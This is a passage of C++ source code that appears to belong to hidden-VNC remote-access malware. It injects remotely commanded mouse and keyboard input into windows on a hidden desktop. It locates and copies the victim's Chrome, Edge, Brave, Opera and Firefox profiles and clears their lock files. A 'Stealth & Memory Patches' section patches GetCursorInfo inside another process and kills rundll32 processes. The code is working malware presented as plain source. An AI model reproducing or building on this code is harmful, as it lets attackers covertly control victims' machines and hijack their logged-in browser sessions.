    FreeWinCache();
    if (g_compHdcRef) { ReleaseDC(0, g_compHdcRef); g_compHdcRef = NULL; }
}

// -------------------------------------------------------------------------
//  Input Redirect Helpers
// -------------------------------------------------------------------------

static string WinClass(HWND hwnd) {
    wchar_t buf[256] = {0};
    GetClassNameW(hwnd, buf, 256);
    wstring ws(buf);
    return string(ws.begin(), ws.end());
}

static bool IsNonPrintableVK(int vk) {
    if (vk >= 0x70 && vk <= 0x7B) return true; // F1-F12
    if (vk >= 0x21 && vk <= 0x28) return true; // PgUp/Down/End/Home/Arrows
    if (vk == 0x2D || vk == 0x2E) return true; // Insert/Delete
    if (vk == 0x0D || vk == 0x1B || vk == 0x09 || vk == 0x08) return true; // Enter/Esc/Tab/Back
    if (vk == 0x10 || vk == 0xA0 || vk == 0xA1 || vk == 0x11 || vk == 0xA2 || vk == 0xA3 ||
        vk == 0x12 || vk == 0xA4 || vk == 0xA5 || vk == 0x14) return true; // Shift/Ctrl/Alt/CapsLock
    if (vk == 0x5B || vk == 0x5C || vk == 0x5D) return true; // Win keys
    return false;
}

static wstring VkToChars(int vk) {
    BYTE state[256] = {0};
    if (g_shiftDown) state[0x10] = 0x80;
    if (g_ctrlDown)  state[0x11] = 0x80;
    if (g_altDown)   state[0x12] = 0x80;
    if (g_capsLock)  state[0x14] = 0x01;
    UINT scan = MapVirtualKeyW((UINT)vk, 0);
    wchar_t buf[8] = {0};
    int n = ToUnicode((UINT)vk, scan, state, buf, 8, 0);
    if (n > 0) return wstring(buf, n);
    return L"";
}

static HWND SmartWindowFromPoint(POINT pt) {
    for (int attempt = 0; attempt < 4; attempt++) {
        HWND hwnd = WindowFromPoint(pt);
        if (!hwnd) return NULL;
        string cls = WinClass(hwnd);
        if (cls == "UserOOBEWindowClass" || cls == "WorkerW" || cls == "Progman") {
            int ex = GetWindowLongW(hwnd, GWL_EXSTYLE);
            if ((ex & WS_EX_TRANSPARENT) == 0) {
                SetWindowLongW(hwnd, GWL_EXSTYLE, ex | WS_EX_TRANSPARENT);
            }
            continue;
        }
        return hwnd;
    }
    return WindowFromPoint(pt);
}

static bool IsTaskbar(HWND hwnd) {
    if (!hwnd) return false;
    HWND r = GetAncestor(hwnd, GA_ROOT);
    return WinClass(r ? r : hwnd) == "Shell_TrayWnd";
}

static bool IsContextMenuOrPopup(HWND prevRoot, HWND root) {
    if (!root) return false;
    if (WinClass(root) == "#32768") return true;
    bool isPopup = ((uint32_t)GetWindowLongW(root, GWL_STYLE) & WS_POPUP) != 0;
    if (!isPopup) return false;
    if (!prevRoot) return false;
    DWORD pidPrev = 0, pidNew = 0;
    GetWindowThreadProcessId(prevRoot, &pidPrev);
    GetWindowThreadProcessId(root, &pidNew);
    return pidPrev != 0 && pidPrev == pidNew;
}

static HWND g_lastHwnd = NULL;

static void ActivateWindow(HWND root, HWND hwnd) {
    SetForegroundWindow(root);
    SetActiveWindow(root);
    SetFocus(hwnd);
    g_lastHwnd = hwnd;
}

static void ActivateIfNewWindow(HWND hwnd) {
    HWND root = GetAncestor(hwnd, GA_ROOT);
    if (!root) root = hwnd;
    HWND prevRoot = g_lastHwnd ? GetAncestor(g_lastHwnd, GA_ROOT) : NULL;
    if (!prevRoot) prevRoot = g_lastHwnd;
    g_lastHwnd = hwnd;
    if (prevRoot == root) return;
    if (IsContextMenuOrPopup(prevRoot, root)) return;
    if (IsTaskbar(root)) return;
    DWORD pidNew = 0, pidPrev = 0;
    GetWindowThreadProcessId(root, &pidNew);
    GetWindowThreadProcessId(prevRoot, &pidPrev);
    if (pidPrev != 0 && pidPrev == pidNew) return;
    ActivateWindow(root, hwnd);
}

static int SafeNCHitTest(HWND hwnd, LPARAM lparam) {
    DWORD_PTR r = 0;
    SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, lparam, SMTO_ABORTIFHUNG, 30, &r);
    return (int)r;
}

static int RefineNCHit(int hit, HWND root, int x, int y) {
    if (hit != HTCAPTION && hit != HTCLIENT && hit != 0) return hit;
    if (hit == HTCLIENT) return HTCLIENT;
    RECT wr;
    if (!GetWindowRect(root, &wr)) return hit;
    int border = GetSystemMetrics(8); // SM_CXSIZEFRAME
    int cy = GetSystemMetrics(4); // SM_CYCAPTION
    int btnW = cy * 2;
    int barTop = wr.top;
    int barBot = wr.top + cy * 2 + border;
    if (y < barTop || y > barBot) return HTCAPTION;
    if (x < wr.left || x > wr.right) return HTCAPTION;
    if (x >= wr.right - btnW) return HTCLOSE;
    if (x >= wr.right - btnW * 2) return HTMAXBUTTON;
    if (x >= wr.right - btnW * 3) return HTMINBUTTON;
    return HTCAPTION;
}

static void send_physical_click(int x, int y, int button, bool down) {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    if (sw <= 0) sw = 1920;
    if (sh <= 0) sh = 1080;
    int normX = (x * 65535) / sw;
    int normY = (y * 65535) / sh;

    INPUT input[2] = {0};
    input[0].type = INPUT_MOUSE;
    input[0].mi.dx = normX;
    input[0].mi.dy = normY;
    input[0].mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;

    input[1].type = INPUT_MOUSE;
    input[1].mi.dx = normX;
    input[1].mi.dy = normY;
    DWORD flags = 0;
    if (button == 0) flags = down ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP;
    else if (button == 1) flags = down ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP;
    else flags = down ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_MIDDLEUP;
    input[1].mi.dwFlags = flags | MOUSEEVENTF_ABSOLUTE;

    SendInput(2, input, sizeof(INPUT));
}

static void HandleMouseMove(int x, int y) {
    g_curX = x; g_curY = y;
    SetCursorPos(x, y);

    if (g_movingWindow && g_movingHwnd) {
        SetWindowPos(g_movingHwnd, 0, x - g_moveOffX, y - g_moveOffY, g_moveSizeW, g_moveSizeH, SWP_NOZORDER | SWP_NOACTIVATE);
        return;
    }

    POINT pt = {x, y};
    HWND hwnd = SmartWindowFromPoint(pt);
    if (!hwnd) return;

    ActivateIfNewWindow(hwnd);
    POINT cPt = pt;
    ScreenToClient(hwnd, &cPt);
    PostMessageW(hwnd, WM_MOUSEMOVE, g_leftButtonDown ? MK_LBUTTON : 0, MAKELPARAM(cPt.x, cPt.y));
}

static void HandleMouseButton(int x, int y, int button, bool down) {
    g_curX = x; g_curY = y;
    SetCursorPos(x, y);
    if (button == 0) g_leftButtonDown = down;

    if (button == 0 && !down && g_movingWindow) {
        SetWindowPos(g_movingHwnd, 0, x - g_moveOffX, y - g_moveOffY, g_moveSizeW, g_moveSizeH, SWP_NOZORDER | SWP_NOACTIVATE);
        g_movingWindow = false; g_movingHwnd = NULL;
        g_lbDownHwnd = NULL;
        if (g_captionFwdHwnd) {
            HWND fwd = g_captionFwdHwnd; g_captionFwdHwnd = NULL;
            POINT cUp = {x, y};
            ScreenToClient(fwd, &cUp);
            PostMessageW(fwd, WM_LBUTTONUP, 0, MAKELPARAM(cUp.x, cUp.y));
        }
        return;
    }

    POINT pt = {x, y};
    HWND hwnd = SmartWindowFromPoint(pt);
    if (!hwnd) return;

    string cls = WinClass(hwnd);
    if (cls == "#32768") {
        send_physical_click(x, y, button, down);
        return;
    }

    HWND root = GetAncestor(hwnd, GA_ROOT);
    if (!root) root = hwnd;

    if (down) {
        HWND prevRoot = g_lastHwnd ? GetAncestor(g_lastHwnd, GA_ROOT) : NULL;
        if (!prevRoot) prevRoot = g_lastHwnd;
        if (!IsContextMenuOrPopup(prevRoot, root)) ActivateWindow(root, hwnd);
    }

    if (button == 0) {
        LPARAM lParam = MAKELPARAM(x, y);
        int hit = RefineNCHit(SafeNCHitTest(hwnd, lParam), root, x, y);

        if (hit != 0 && hit != HTCLIENT) {
            if (down && hit == HTCAPTION) {
                RECT wr;
                GetWindowRect(root, &wr);
                g_movingWindow = true;
                g_movingHwnd   = root;
                g_moveOffX     = x - wr.left;
                g_moveOffY     = y - wr.top;
                g_moveSizeW    = wr.right  - wr.left;
                g_moveSizeH    = wr.bottom - wr.top;
                POINT cFwd = {x, y};
                ScreenToClient(hwnd, &cFwd);
                PostMessageW(hwnd, WM_LBUTTONDOWN, MK_LBUTTON, MAKELPARAM(cFwd.x, cFwd.y));
                g_captionFwdHwnd = hwnd;
                return;
            }
            if (!down) {
                if (hit == HTCLOSE) {
                    POINT cClose = {x, y};
                    ScreenToClient(hwnd, &cClose);
                    PostMessageW(hwnd, WM_LBUTTONUP, 0, MAKELPARAM(cClose.x, cClose.y));
                    PostMessageW(root, WM_CLOSE, 0, 0);
                    string closeCls = WinClass(root);
                    if (closeCls == "CabinetWClass" || closeCls == "ExploreWClass") {
                        DWORD closePid = 0;
                        GetWindowThreadProcessId(root, &closePid);
                        if (closePid != 0) {
                            std::thread([closePid]() {
                                std::this_thread::sleep_for(std::chrono::milliseconds(1500));
                                HANDLE hp = OpenProcess(PROCESS_TERMINATE, FALSE, closePid);
                                if (hp) { TerminateProcess(hp, 0); CloseHandle(hp); }
                            }).detach();
                        }
                    }
                    return;
                }
                if (hit == HTMAXBUTTON) {
                    WINDOWPLACEMENT wp = { sizeof(wp) };
                    GetWindowPlacement(root, &wp);
                    ShowWindow(root, wp.showCmd == 3 ? SW_RESTORE : SW_SHOWMAXIMIZED);
                    return;
                }
                if (hit == HTMINBUTTON) {
                    PostMessageW(root, WM_SYSCOMMAND, SC_MINIMIZE, 0);
                    return;
                }
            }
        }
    }

    bool origIsUia = cls == "UIItemsView" || cls == "DirectUIHWND";
    bool isQt = cls.rfind("Qt5", 0) == 0 || cls.rfind("Qt6", 0) == 0 || cls.rfind("Qt4", 0) == 0;
    bool useSync = origIsUia || isQt;

    POINT cPt = pt;
    ScreenToClient(hwnd, &cPt);
    LPARAM lParam = MAKELPARAM(cPt.x, cPt.y);

    switch (button) {
        case 0: // Left
        {
            if (down) {
                long long now = GetTickCount64();
                bool isDbl = (now - g_lastLeftMs) < 800 &&
                             std::abs(x - g_lastClickX) < 8 &&
                             std::abs(y - g_lastClickY) < 8;
                g_lastLeftMs = now;
                g_lastClickX = x;
                g_lastClickY = y;

                if (useSync) {
                    if (isQt) {
                        DWORD_PTR dummy;
                        SendMessageTimeoutW(hwnd, WM_MOUSEMOVE, 0, lParam, SMTO_ABORTIFHUNG, 50, &dummy);
                    }
                    DWORD_PTR dummy;
                    SendMessageTimeoutW(hwnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 200, &dummy);
                    g_lbDownHwnd = hwnd;
                    if (isDbl) {
                        SendMessageTimeoutW(hwnd, WM_LBUTTONDBLCLK, MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 200, &dummy);
                        UINT scanRet = MapVirtualKeyW(0x0D, 0);
                        PostMessageW(root, WM_KEYDOWN, 0x0D, (LPARAM)(1u | (scanRet << 16)));
                        PostMessageW(root, WM_KEYUP,   0x0D, (LPARAM)(0xC0000001u | (scanRet << 16)));
                    }
                } else {
                    PostMessageW(hwnd, WM_MOUSEMOVE, 0, lParam);
                    PostMessageW(hwnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam);
                    g_lbDownHwnd = hwnd;
                    if (isDbl) {
                        PostMessageW(hwnd, WM_LBUTTONDBLCLK, MK_LBUTTON, lParam);
                        UINT scanRet = MapVirtualKeyW(0x0D, 0);
                        PostMessageW(root, WM_KEYDOWN, 0x0D, (LPARAM)(1u | (scanRet << 16)));
                        PostMessageW(root, WM_KEYUP,   0x0D, (LPARAM)(0xC0000001u | (scanRet << 16)));
                    }
                }
            } else {
                HWND upTarget = (g_lbDownHwnd != NULL && g_lbDownHwnd != hwnd) ? g_lbDownHwnd : hwnd;
                g_lbDownHwnd = NULL;
                if (upTarget != hwnd) {
                    POINT upPt = {x, y};
                    ScreenToClient(upTarget, &upPt);
                    lParam = MAKELPARAM(upPt.x, upPt.y);
                }
                if (useSync) {
                    DWORD_PTR dummy;
                    SendMessageTimeoutW(upTarget, WM_MOUSEMOVE, MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 50, &dummy);
                    SendMessageTimeoutW(upTarget, WM_LBUTTONUP, 0, lParam, SMTO_ABORTIFHUNG, 200, &dummy);
                } else {
                    PostMessageW(upTarget, WM_MOUSEMOVE, MK_LBUTTON, lParam);
                    PostMessageW(upTarget, WM_LBUTTONUP, 0, lParam);
                }
            }
            break;
        }
        case 1: // Right
        {
            PostMessageW(hwnd, down ? WM_RBUTTONDOWN : WM_RBUTTONUP, down ? MK_RBUTTON : 0, lParam);
            break;
        }
        default: // Middle
        {
            PostMessageW(hwnd, down ? WM_MBUTTONDOWN : WM_MBUTTONUP, down ? MK_MBUTTON : 0, lParam);
            break;
        }
    }
}

static void HandleMouseWheel(int delta) {
    POINT pt = {g_curX, g_curY};
    HWND hwnd = WindowFromPoint(pt);
    if (!hwnd) hwnd = g_lastHwnd;
    if (!hwnd) return;
    WPARAM wp = (WPARAM)(((uint32_t)(short)delta << 16) & 0xFFFF0000);
    PostMessageW(hwnd, WM_MOUSEWHEEL, wp, MAKELPARAM(g_curX, g_curY));
}

static void set_key_down(BYTE state[256], int vk, bool down) {
    if (vk >= 0 && vk < 256) state[vk] = down ? 0x80 : 0;
}

static void apply_modifier_state(BYTE state[256], bool ctrlDown, bool altDown, bool shiftDown) {
    set_key_down(state, VK_CONTROL, ctrlDown);
    set_key_down(state, VK_LCONTROL, ctrlDown);
    set_key_down(state, VK_RCONTROL, ctrlDown);
    set_key_down(state, VK_MENU, altDown);
    set_key_down(state, VK_LMENU, altDown);
    set_key_down(state, VK_RMENU, altDown);
    set_key_down(state, VK_SHIFT, shiftDown);
    set_key_down(state, VK_LSHIFT, shiftDown);
    set_key_down(state, VK_RSHIFT, shiftDown);
}

static void send_keyboard_message(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam,
                                  bool ctrlDown, bool altDown, bool shiftDown) {
    DWORD targetThreadId = GetWindowThreadProcessId(hwnd, NULL);
    DWORD currentThreadId = GetCurrentThreadId();
    bool attached = false;

    if (targetThreadId && targetThreadId != currentThreadId) {
        attached = AttachThreadInput(currentThreadId, targetThreadId, TRUE) != FALSE;
    }

    BYTE oldState[256] = {};
    BYTE newState[256] = {};
    bool hasOldState = GetKeyboardState(oldState) != FALSE;
    if (hasOldState) {
        memcpy(newState, oldState, sizeof(newState));
    }

    apply_modifier_state(newState, ctrlDown, altDown, shiftDown);
    SetKeyboardState(newState);

    DWORD_PTR result = 0;
    SendMessageTimeoutW(hwnd, msg, wParam, lParam, SMTO_ABORTIFHUNG, 100, &result);

    if (hasOldState) {
        SetKeyboardState(oldState);
    }
    if (attached) {
        AttachThreadInput(currentThreadId, targetThreadId, FALSE);
    }
}

static void HandleKey(int vk, bool down) {
    switch (vk) {
        case 0x10: case 0xA0: case 0xA1: g_shiftDown = down; break; // Shift
        case 0x11: case 0xA2: case 0xA3: g_ctrlDown  = down; break; // Ctrl
        case 0x12: case 0xA4: case 0xA5: g_altDown   = down; break; // Alt
        case 0x14: if (down) g_capsLock = !g_capsLock; break;       // CapsLock toggle
    }

    POINT pt = {g_curX, g_curY};
    HWND hwnd = WindowFromPoint(pt);
    if (!hwnd) hwnd = g_lastHwnd;
    if (!hwnd) hwnd = GetForegroundWindow();
    if (!hwnd) return;

    HWND root = GetAncestor(hwnd, GA_ROOT);
    if (!root) root = hwnd;

    DWORD tid = GetWindowThreadProcessId(root, NULL);
    if (tid != 0) {
        GUITHREADINFO gi = { sizeof(gi) };
        if (GetGUIThreadInfo(tid, &gi) && gi.hwndFocus != 0) {
            hwnd = gi.hwndFocus;
        }
    }

    UINT scan = MapVirtualKeyW((UINT)vk, 0);
    LPARAM lpDn = (LPARAM)(1u | (scan << 16));
    LPARAM lpUp = (LPARAM)(0xC0000001u | (scan << 16));

    UINT msg = down ? WM_KEYDOWN : WM_KEYUP;
    LPARAM lp = down ? lpDn : lpUp;

    send_keyboard_message(hwnd, msg, (WPARAM)vk, lp, g_ctrlDown, g_altDown, g_shiftDown);
}

// -------------------------------------------------------------------------
//  Input Thread Loop
// -------------------------------------------------------------------------

static void input_loop() {
    ensure_desktop();
    if (!g_hHiddenDesktop) { g_inputRunning = false; return; }
    if (!SetThreadDesktop(g_hHiddenDesktop)) { g_inputRunning = false; return; }

    while (g_inputRunning) {
        InputTask task;
        {
            unique_lock<mutex> lock(g_inputMutex);
            g_inputCV.wait(lock, [] { return !g_inputQueue.empty() || !g_inputRunning; });
            if (!g_inputRunning) {
                g_inputQueue.clear();
                break;
            }
            task = g_inputQueue.front();
            g_inputQueue.pop_front();
        }

        const string& action = task.action;
        const json&   cmd    = task.cmd;

        if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
            int vk = cmd.value("keycode", 0);
            bool down = (action == "hvnc_keydown" || action == "hvnc_char");
            if (action == "hvnc_char") {
                POINT pt = {g_curX, g_curY};
                HWND hwnd = WindowFromPoint(pt);
                if (!hwnd) hwnd = g_lastHwnd;
                if (!hwnd) hwnd = GetForegroundWindow();
                if (hwnd) {
                    send_keyboard_message(hwnd, WM_CHAR, (WPARAM)vk, 1, g_ctrlDown, g_altDown, g_shiftDown);
                }
            } else {
                HandleKey(vk, down);
            }
            request_full_frame(true);
        } else if (action == "hvnc_mousemove") {
            int normX = cmd.value("x", 0);
            int normY = cmd.value("y", 0);
            int x = (normX * g_canvasW) / 65535;
            int y = (normY * g_canvasH) / 65535;
            HandleMouseMove(x, y);
            request_full_frame(false);
        } else if (action == "hvnc_mousedown" || action == "hvnc_mouseup" || action == "hvnc_doubleclick") {
            int normX = cmd.value("x", 0);
            int normY = cmd.value("y", 0);
            int button = cmd.value("button", 0);
            int x = (normX * g_canvasW) / 65535;
            int y = (normY * g_canvasH) / 65535;
            bool down = (action == "hvnc_mousedown" || action == "hvnc_doubleclick");

            HandleMouseButton(x, y, button, down);
            if (action == "hvnc_doubleclick") {
                HandleMouseButton(x, y, button, false);
                HandleMouseButton(x, y, button, true);
                HandleMouseButton(x, y, button, false);
            }
            request_full_frame(true);
        }
    }
}

// -------------------------------------------------------------------------
//  Browser Profile Copying / Lock Cleaning / Repairing / Launch Helpers
// -------------------------------------------------------------------------

static wstring get_app_path(const wstring& appName) {
    HKEY hKey;
    wstring subkey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + appName;
    wstring path;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t buffer[MAX_PATH];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            path = buffer;
        }
        RegCloseKey(hKey);
    }
    if (path.empty()) {
        if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            wchar_t buffer[MAX_PATH];
            DWORD size = sizeof(buffer);
            if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
                path = buffer;
            }
            RegCloseKey(hKey);
        }
    }
    return path;
}

static wstring ResolveGlob(const wstring& path) {
    size_t star = path.find(L'*');
    if (star == wstring::npos) return L"";
    size_t slashBefore = path.rfind(L'\\', star);
    if (slashBefore == wstring::npos) return L"";

    wstring dir = path.substr(0, slashBefore);
    wstring rest = path.substr(slashBefore + 1); // "app-*\Discord.exe"
    size_t slashAfter = rest.find(L'\\');
    wstring pattern = (slashAfter != wstring::npos) ? rest.substr(0, slashAfter) : rest;
    wstring suffix = (slashAfter != wstring::npos) ? rest.substr(slashAfter + 1) : L"";

    if (!fs::exists(dir)) return L"";

    std::vector<wstring> matches;
    try {
        for (const auto& entry : fs::directory_iterator(dir)) {
            if (entry.is_directory()) {
                wstring name = entry.path().filename().wstring();
                // Simple pattern matching (starts with pattern before *)
                size_t pStar = pattern.find(L'*');
                wstring prefix = pattern.substr(0, pStar);
                if (name.rfind(prefix, 0) == 0) {
                    matches.push_back(entry.path().wstring());
                }
            }
        }
    } catch (...) {}

    if (matches.empty()) return L"";
    std::sort(matches.begin(), matches.end()); // highest version is last

    for (int i = (int)matches.size() - 1; i >= 0; i--) {
        wstring candidate = suffix.empty() ? matches[i] : (wstring(matches[i]) + L"\\" + suffix);
        if (fs::exists(candidate)) return candidate;
    }
    return L"";
}

static bool ExeExists(const wstring& path) {
    size_t e = path.find(L".exe");
    wstring exePath = (e != wstring::npos) ? path.substr(0, e + 4) : path;
    return fs::exists(exePath);
}

static wstring AltProgramFiles(const wstring& path) {
    wchar_t pf64[MAX_PATH] = L"C:\\Program Files";
    wchar_t pf86[MAX_PATH] = L"C:\\Program Files (x86)";
    GetEnvironmentVariableW(L"ProgramFiles", pf64, MAX_PATH);
    GetEnvironmentVariableW(L"ProgramFiles(x86)", pf86, MAX_PATH);

    if (path.rfind(pf64, 0) == 0) {
        return wstring(pf86) + path.substr(wcslen(pf64));
    }
    if (path.rfind(pf86, 0) == 0) {
        return wstring(pf64) + path.substr(wcslen(pf86));
    }
    return L"";
}

static wstring GetChromiumRealProfile(const wstring& exeBase) {
    wchar_t local[MAX_PATH];
    wchar_t roaming[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local);
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, roaming);

    wstring exe = exeBase;
    std::transform(exe.begin(), exe.end(), exe.begin(), ::towlower);

    if (exe == L"chrome.exe") {
        return wstring(local) + L"\\Google\\Chrome\\User Data";
    } else if (exe == L"msedge.exe") {
        return wstring(local) + L"\\Microsoft\\Edge\\User Data";
    } else if (exe == L"brave.exe") {
        return wstring(local) + L"\\BraveSoftware\\Brave-Browser\\User Data";
    } else if (exe == L"vivaldi.exe") {
        return wstring(local) + L"\\Vivaldi\\User Data";
    } else if (exe == L"chromium.exe") {
        return wstring(local) + L"\\Chromium\\User Data";
    } else if (exe == L"opera.exe") {
        return wstring(roaming) + L"\\Opera Software\\Opera Stable";
    }
    return L"";
}

static wstring GetFirefoxRealProfile() {
    wchar_t roaming[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, roaming);
    wstring ffBase = wstring(roaming) + L"\\Mozilla\\Firefox";
    wstring iniPath = ffBase + L"\\profiles.ini";
    if (!fs::exists(iniPath)) return L"";

    wstring bestPath = L"";
    wstring currentPath = L"";
    bool isRelative = true;
    bool isDefault = false;

    auto Commit = [&]() {
        if (currentPath.empty()) return;
        wstring rel = currentPath;
        std::replace(rel.begin(), rel.end(), L'/', L'\\');
        wstring full = isRelative ? (ffBase + L"\\" + rel) : currentPath;
        if (bestPath.empty() || isDefault) {
            bestPath = full;
        }
    };

    std::wifstream f(iniPath.c_str());
    if (f.is_open()) {
        wstring line;
        while (std::getline(f, line)) {
            // Trim
            size_t start = line.find_first_not_of(L" \t\r\n");
            if (start == wstring::npos) continue;
            size_t end = line.find_last_not_of(L" \t\r\n");
            wstring t = line.substr(start, end - start + 1);

            if (t.empty()) continue;

            if (t[0] == L'[') {
                Commit();
                currentPath = L"";
                isRelative = true;
                isDefault = false;
            } else if (t.rfind(L"Path=", 0) == 0) {
                currentPath = t.substr(5);
            } else if (t.rfind(L"IsRelative=", 0) == 0) {
                isRelative = t.substr(11) == L"1";
            } else if (lstrcmpiW(t.c_str(), L"Default=1") == 0) {
                isDefault = true;
            }
        }
        Commit();
        f.close();
    }

    if (!bestPath.empty() && fs::exists(bestPath)) return bestPath;
    return L"";
}

static void RepairChromiumJsonFile(const fs::path& path) {
    if (!fs::exists(path)) return;
    try {
        std::ifstream f(path.wstring().c_str());
        if (!f.is_open()) return;
        std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
        f.close();

        // Check if whitespace or empty
        bool allWhitespace = true;
        for (char c : content) {
            if (!std::isspace(static_cast<unsigned char>(c))) {
                allWhitespace = false;
                break;
            }
        }
        if (allWhitespace || content.size() < 2) {
            fs::remove(path);
            return;
        }

        // Parse with nlohmann::json to validate JSON
        auto j = json::parse(content);
    } catch (...) {
        try { fs::remove(path); } catch (...) {}
    }
}

static void CleanChromiumHvncLocks() {
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    fs::path hvncRoot = fs::path(tempPath) / L"SeroHvnc";
    if (!fs::exists(hvncRoot)) return;
    try {
        for (const auto& entry : fs::directory_iterator(hvncRoot)) {
            if (entry.is_directory()) {
                fs::path d = entry.path();
                for (const auto& name : {L"SingletonLock", L"SingletonSocket", L"SingletonCookie"}) {
                    try { fs::remove(d / name); } catch (...) {}
                }
                RepairChromiumJsonFile(d / L"Default" / L"Preferences");
                RepairChromiumJsonFile(d / L"Local State");
            }
        }
    } catch (...) {}
}

static void CleanRealBrowserLock(const std::vector<wstring>& parts) {
    wchar_t appData[MAX_PATH];
    wchar_t localApp[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData);
    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);

    for (const auto& root : {appData, localApp}) {
        fs::path dir(root);
        for (const auto& part : parts) {
            dir /= part;
        }
        for (const auto& name : {L"SingletonLock", L"SingletonSocket", L"SingletonCookie"}) {
            try { fs::remove(dir / name); } catch (...) {}
        }
    }
}

static void CleanFirefoxRealLocks() {
    wstring p = GetFirefoxRealProfile();
    if (p.empty()) return;
    for (const auto& name : {L"parent.lock", L"lock"}) {
        try { fs::remove(fs::path(p) / name); } catch (...) {}
    }
}

static void RepairOperaProfileAfterHvnc() {
    wchar_t appData[MAX_PATH];
    wchar_t localApp[MAX_PATH];
    wchar_t tempPath[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData);
    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
    GetTempPathW(MAX_PATH, tempPath);

    for (const auto& hvncDir : {L"hvnc_opera", L"hvnc_operagx"}) {
        fs::path d = fs::path(tempPath) / hvncDir;
        if (fs::exists(d)) {
            try { fs::remove_all(d); } catch (...) {}
        }
    }

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Opera Software", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD val = 0;
        RegSetValueExW(hKey, L"ATTEMPTS", 0, REG_DWORD, (BYTE*)&val, sizeof(DWORD));
        RegCloseKey(hKey);
    }

    for (const auto& variant : {L"Opera Stable", L"Opera GX Stable"}) {
        for (const auto& root : {appData, localApp}) {
            fs::path profileDir = fs::path(root) / L"Opera Software" / variant;
            if (!fs::exists(profileDir)) continue;

            for (const auto& name : {L"SingletonLock", L"SingletonSocket", L"SingletonCookie"}) {
                try { fs::remove(profileDir / name); } catch (...) {}
            }

            RepairChromiumJsonFile(profileDir / L"Local State");

            for (const auto& sub : {L"Default", L"Profile 1", L"Guest Profile"}) {
                fs::path subDir = profileDir / sub;
                if (!fs::exists(subDir)) continue;
                RepairChromiumJsonFile(subDir / L"Preferences");
                RepairChromiumJsonFile(subDir / L"Secure Preferences");
            }
        }
    }
}

// -------------------------------------------------------------------------
//  Stealth & Memory Patches
// -------------------------------------------------------------------------

static bool PatchCursorInfo(DWORD pid) {
    HMODULE user32 = GetModuleHandleW(L"user32.dll");
    if (!user32) return false;
    FARPROC addr = GetProcAddress(user32, "GetCursorInfo");
    if (!addr) return false;

    HANDLE hProc = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
    if (!hProc) return false;

    BYTE patch[] = {0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3}; // mov eax, 1; ret
    DWORD oldProt = 0;
    if (!VirtualProtectEx(hProc, (LPVOID)addr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt)) {
        CloseHandle(hProc);
        return false;
    }
    SIZE_T written = 0;
    bool ok = WriteProcessMemory(hProc, (LPVOID)addr, patch, sizeof(patch), &written);
    VirtualProtectEx(hProc, (LPVOID)addr, sizeof(patch), oldProt, &oldProt);
    CloseHandle(hProc);
    return ok && written == sizeof(patch);
}

static void PatchCursorInfoAsync(DWORD pid) {
    std::thread([pid]() {
        for (int i = 0; i < 15; i++) {
            std::this_thread::sleep_for(std::chrono::milliseconds(2000));
            if (PatchCursorInfo(pid)) {
                break;
            }
        }
    }).detach();
}

static void KillChildRundll32(DWORD parentPid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (pe.th32ParentProcessID == parentPid &&
                lstrcmpiW(pe.szExeFile, L"rundll32.exe") == 0) {
                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProc) {
                    TerminateProcess(hProc, 0);
                    CloseHandle(hProc);
                }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
}

static void KillRundll32OnHvncDesktop() {
    if (!g_hHiddenDesktop) return;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    std::set<DWORD> rundll32Pids;
    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (lstrcmpiW(pe.szExeFile, L"rundll32.exe") == 0) {
                rundll32Pids.insert(pe.th32ProcessID);
            }
        } while (Process32NextW(snap, &pe));
    }
